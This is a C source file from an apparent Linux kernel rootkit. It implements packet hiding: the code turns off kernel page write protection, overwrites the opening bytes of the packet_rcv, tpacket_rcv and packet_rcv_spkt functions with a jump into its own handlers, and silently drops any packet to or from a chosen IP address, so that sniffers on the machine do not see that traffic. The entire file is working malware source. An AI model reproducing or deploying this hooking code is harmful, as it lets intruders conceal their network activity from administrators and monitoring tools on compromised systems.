/*
 * This file provides all the functionality needed for hiding packets.
 */
#include <net/ip.h>
#include <linux/inet.h>

#include "include.h"
#include "main.h"

#define JUMP_CODE_SIZE 6

int manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);
int manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);
int manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);






/* the functions that are being hooked */
int (*packet_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) sysmap_packet_rcv;
int (*packet_rcv_spkt)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) sysmap_packet_rcv_spkt;
int (*tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) sysmap_tpacket_rcv;

/* the ip to be hidden */
static unsigned int hidden_ip = 0;

/* spinlocks for each function we hook */
spinlock_t packet_rcv_lock;
unsigned long packet_rcv_flags;
spinlock_t tpacket_rcv_lock;
unsigned long tpacket_rcv_flags;
spinlock_t packet_rcv_spkt_lock;
unsigned long packet_rcv_spkt_flags;

char hook[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
unsigned int *target = (unsigned int *) (hook + 1);

/* code of the original functions that has been overwritten by us */
char original_packet_rcv[6];
char original_tpacket_rcv[6];
char original_packet_rcv_spkt[6];

/* Check if we need to hide this perticular packet */
int
is_packet_hidden (struct sk_buff *skb)
{
	if (skb->protocol == htons(ETH_P_IP)) {
		struct iphdr* iphdr = (struct iphdr*) skb_network_header(skb);

		if (iphdr->saddr == hidden_ip || iphdr->daddr == hidden_ip){
			return 1;
		}
	}	
	return 0;
}

void
hook_packet_rcv (void)
{
	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);

	/* disable write protection */
	disable_page_protection();
	
	*target = (unsigned int *) manipulated_packet_rcv;
	memcpy(original_packet_rcv, packet_rcv, 6);
	memcpy(packet_rcv, hook, 6);
	
	/* reenable write protection */
	enable_page_protection();

	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
}

void
hook_tpacket_rcv (void)
{
	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);

	/* disable write protection */
	disable_page_protection();
	
	*target = (unsigned int *) manipulated_tpacket_rcv;
	memcpy(original_tpacket_rcv, tpacket_rcv, 6);
	memcpy(tpacket_rcv, hook, 6);
	
	/* reenable write protection */
	enable_page_protection();

	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
}

void
hook_packet_rcv_spkt (void)
{
	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	/* disable write protection */
	disable_page_protection();
	
	*target = (unsigned int *) manipulated_packet_rcv_spkt;
	memcpy(original_packet_rcv_spkt, packet_rcv_spkt, 6);
	memcpy(packet_rcv_spkt, hook, 6);
	
	/* reenable write protection */
	enable_page_protection();

	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
}

void
unhook_packet_rcv (void)
{
	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
	
	/* disable write protection */
	disable_page_protection();

	memcpy(packet_rcv, original_packet_rcv, 6);

	/* reenable write protection */
	enable_page_protection();

	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
}

void
unhook_tpacket_rcv (void)
{
	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
	
	/* disable write protection */
	disable_page_protection();

	memcpy(tpacket_rcv, original_tpacket_rcv, 6);

	/* reenable write protection */
	enable_page_protection();

	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
}


void
unhook_packet_rcv_spkt (void)
{
	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
	
	/* disable write protection */
	disable_page_protection();

	memcpy(packet_rcv_spkt, original_packet_rcv_spkt, 6); 

	/* reenable write protection */
	enable_page_protection();

	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
}

int
manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
{
	int ret;
	
	if(is_packet_hidden(skb))
	{	
		ROOTKIT_DEBUG("Dropped the packet in 'packet_rcv'.\n"); 
		return 0; 
	}

	unhook_packet_rcv();
	ret = packet_rcv(skb,dev,pt,orig_dev);
	hook_packet_rcv();
	
	return ret;	
}

int
manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
{
	int ret;
	
	if(is_packet_hidden(skb))
	{	
		ROOTKIT_DEBUG("Dropped the packet in 'tpacket_rcv'.\n"); 
		return 0; 
	}

	unhook_tpacket_rcv();
	ret = tpacket_rcv(skb,dev,pt,orig_dev);
	hook_tpacket_rcv();
	
	return ret;	
}

int
manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
{
	int ret;
	
	if(is_packet_hidden(skb))
	{	
		ROOTKIT_DEBUG("Dropped the packet in 'packet_rcv_spkt'.\n"); 
		return 0; 
	} 

	unhook_packet_rcv_spkt();
	ret = packet_rcv_spkt(skb,dev,pt,orig_dev);
	hook_packet_rcv_spkt();
	
	return ret;	
}

/* hooks all functions needed to hide packets */
void
load_packet_hiding (char *ipv4_addr)
{
	u8 dst[4];
        
	ROOTKIT_DEBUG("Loading packet hiding... bye!\n");
	
	in4_pton(ipv4_addr, -1, dst, -1, NULL); // Use the same function for convert into integer
	hidden_ip = *(unsigned int *)dst; 
	
	hook_packet_rcv();
	hook_tpacket_rcv();
	hook_packet_rcv_spkt();

	ROOTKIT_DEBUG("Done.\n");
}

/* unhooks all functions */
void
unload_packet_hiding (void)
{
        ROOTKIT_DEBUG("Unloading packet hiding... bye!\n");

	unhook_packet_rcv();
	unhook_tpacket_rcv();
	unhook_packet_rcv_spkt();

	ROOTKIT_DEBUG("Done.\n");
}
